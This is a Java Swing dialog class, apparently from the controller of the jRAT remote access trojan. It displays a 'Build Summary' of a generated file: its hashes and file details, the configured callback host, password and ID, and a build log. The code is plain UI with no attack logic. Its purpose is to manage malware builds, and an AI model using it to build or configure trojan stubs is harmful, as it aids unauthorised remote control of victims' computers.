package jrat.controller.ui.dialogs;

import jrat.api.Resources;
import jrat.common.hash.Md5;
import jrat.common.hash.Sha1;
import jrat.common.utils.DataUnits;
import jrat.controller.build.BuildStatus;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.renderers.table.BuildTableRenderer;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import java.io.File;
import java.util.LinkedHashMap;


@SuppressWarnings("serial")
public class DialogSummary extends JDialog {

	private File file;
	private String hosts;
	private String pass;
	private String id;
	private LinkedHashMap<String, BuildStatus> statuses;

	private JPanel contentPane;
	private JTable table;
	private TableModel infomodel;
	private TableModel generalmodel;
	private TableModel logmodel;
	private JTable table_1;
	private JTable table_2;

	public DialogSummary(File file, String hosts, String pass, String id, LinkedHashMap<String, BuildStatus> statuses) {
		this.file = file;
		this.hosts = hosts;
		this.pass = pass;
		this.id = id;
		this.statuses = statuses;

		setModal(true);
		setTitle("Build Summary");
		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new BoxLayout(contentPane, BoxLayout.X_AXIS));

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		contentPane.add(tabbedPane);

		JPanel panel_1 = new JPanel();
		tabbedPane.addTab("General", Resources.getIcon("id"), panel_1, null);
		panel_1.setLayout(new BoxLayout(panel_1, BoxLayout.X_AXIS));

		JScrollPane scrollPane_1 = new JScrollPane();
		panel_1.add(scrollPane_1);

		table_1 = new DefaultJTable();
		table_1.setModel(new TableModel(new Object[][] {}, new String[] { "Property", "Value" }));
		table_1.setRowHeight(25);
		generalmodel = (TableModel) table_1.getModel();
		scrollPane_1.setViewportView(table_1);

		JPanel panel = new JPanel();

		tabbedPane.addTab("File Information", Resources.getIcon("file"), panel, null);
		panel.setLayout(new BoxLayout(panel, BoxLayout.X_AXIS));

		JScrollPane scrollPane = new JScrollPane();
		panel.add(scrollPane);

		table = new DefaultJTable();
		table.setModel(new TableModel(new Object[][] {}, new String[] { "Property", "Value" }));
		table.setRowHeight(25);

		infomodel = (TableModel) table.getModel();
		scrollPane.setViewportView(table);

		JPanel panel_2 = new JPanel();
		tabbedPane.addTab("Log", Resources.getIcon("log"), panel_2, null);
		panel_2.setLayout(new BoxLayout(panel_2, BoxLayout.X_AXIS));

		JScrollPane scrollPane_2 = new JScrollPane();
		panel_2.add(scrollPane_2);

		table_2 = new DefaultJTable();
		table_2.setDefaultRenderer(Object.class, new BuildTableRenderer(statuses));
		table_2.setModel(new TableModel(new Object[][] {}, new String[] { "Action" }));
		table_2.setRowHeight(25);
		logmodel = (TableModel) table_2.getModel();
		scrollPane_2.setViewportView(table_2);

		setLocationRelativeTo(null);

		reload();
	}

	public void reload() {
		try {
			Md5 md5 = new Md5();
			Sha1 sha1 = new Sha1();
			
			infomodel.addRow(new Object[] { "MD5", md5.hash(file) });
			infomodel.addRow(new Object[] { "SHA1", sha1.hash(file) });
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		infomodel.addRow(new Object[] { "Name", file.getName() });
		infomodel.addRow(new Object[] { "Type", file.getName().substring(file.getName().lastIndexOf(".") + 1, file.getName().length()).toUpperCase() + " File" });
		infomodel.addRow(new Object[] { "File Location", file.getAbsolutePath() });
		infomodel.addRow(new Object[] { "Folder", file.getParent() });
		infomodel.addRow(new Object[] { "File size", DataUnits.getAsString(file.length()) });

		generalmodel.addRow(new Object[] { "Host", hosts });
		generalmodel.addRow(new Object[] { "Password", pass });
		generalmodel.addRow(new Object[] { "ID", id });

		for (String str : statuses.keySet()) {
			logmodel.addRow(new Object[] { str });
		}
	}
}
